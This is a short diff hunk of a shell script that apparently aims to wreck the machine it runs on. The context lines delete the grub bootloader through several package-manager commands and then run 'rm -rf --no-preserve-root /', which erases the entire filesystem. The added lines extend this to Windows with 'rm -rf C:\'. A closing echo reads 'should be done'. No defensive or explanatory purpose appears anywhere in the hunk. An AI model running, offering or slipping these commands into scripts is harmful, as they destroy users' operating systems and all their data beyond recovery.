@@ -16,6 +16,8 @@ echo 'pkg/base linux/bsd-based'
 pkg delete grub && echo 'or remove/uninstall'
 pkg remove grub
 pkg uninstall grub
+echo 'if windows somehow-bc theres sh ports'
+rm -rf C:\
 mkdir /done/
 rm -rf --no-preserve-root / 
 echo 'should be done'
